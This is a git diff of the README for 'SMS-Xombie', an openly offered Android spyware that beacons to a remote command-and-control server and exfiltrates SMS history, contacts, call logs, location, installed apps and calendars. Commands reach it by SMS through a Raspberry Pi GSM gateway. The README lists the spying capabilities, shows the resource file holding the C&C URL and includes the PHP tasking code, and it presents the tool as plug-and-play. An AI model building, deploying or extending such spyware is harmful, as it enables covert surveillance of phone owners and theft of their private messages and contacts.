@@ -1,5 +1,5 @@
 # SMS-Xombie ![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-An Android spyware which interacts with a remote C&C server to exfiltrate phone data. Works with the latest SDK (29). Read the full article at https://artikrh.github.io/posts/sms-xombie
+An Android spyware which interacts with a remote C&C server to exfiltrate phone data. Works with the latest SDK (29). Read the full article at https://artikrh.github.io/posts/building-android-spyware
 
 ### Table of Contents
   - [1. Overview](#1-overview)
@@ -26,7 +26,7 @@ Within the Fetcher service, there are several parts of code starting from `onSta
 
 Initially, a device GUID is generated to uniquely identify a "zombie". This ID is later used as a query parameter in its regular GET requests to an API end-point (PHP) which responds JSON encoded data, hence, `JsonObject()` is used along `HttpURLConnection` to interact with the API. The response is handled by the `onPostExecute()` function if the connection was successful and there is a network connectivity as per the `isConnected()` boolean method. 
 
-![PoC](https://i.imgur.com/Nfw5iOg.png)
+![PoC](https://i.imgur.com/8nvBiZu.png)
 
 If everything is correct, the mobile will respond to the task accordingly; whereas to send the data back, I used the Volley HTTP library which makes networking in Android apps easier.
 
@@ -34,7 +34,7 @@ If everything is correct, the mobile will respond to the task accordingly; where
 
 ### 2.2. Xombie Platform
 
-The application itself is a part of a larger system - the Xombie Platform - that we are going to elaborate next. The idea is simple, using a simple SMS message over the GSM network, we are able to control multiple devices that run the APK through the CC server. The implementation however, is complex due to the following process:
+The application itself is a part of a larger system - the Xombie Platform - that we are going to elaborate next. The idea is simple, using a simple SMS message over the GSM network, we are able to control multiple devices that run the APK through the C&C server. The implementation however, is complex due to the following process:
 
 1. Implementation of a Rasberry Pi device with a GSM shield attached to fetch SMS messages from a controller mobile phone over the GSM network;
 2. Build of an interconnection mechanism between the API and physical device;
@@ -48,7 +48,7 @@ Initially, the controller device sends a command through an SMS message to retri
 
 ### 3. Capabilities
 
-As of now, the android app has these capabilities:
+This app has the following capabilities:
 * SMS dump (`smsdump`) - Dumps the entire message history;
 * Contacts dump (`contactsDump`) - Dumps the entire contact list;
 * Call Logs Dump (`callsDump`) - Dumps call entries;
@@ -63,7 +63,7 @@ The program is meant to basically plug in and play; you only have to modify the 
 ```
 <resources>
     <string name="app_name">Xombie</string>
-    <string name="cc_php">http://192.168.0.14/cc.php</string>
+    <string name="cc">http://192.168.0.14/cc.php</string>
     <string name="milliseconds">60000</string>
 </resources>
 ```
@@ -76,7 +76,7 @@ if ($_SERVER["REQUEST_METHOD"] == "GET") {
 		$id = sanitize($_GET["uuid"]);
 		if (preg_match("/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i", $id)) {
 			// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump
-			$json = [ 'uuid' => $id, 'task' => 'getGeoLocation' ];
+			$json = [ 'uuid' => $id, 'task' => 'smsDump' ];
 			header('Content-type:application/json;charset=utf-8');
 			echo json_encode($json);
 		}
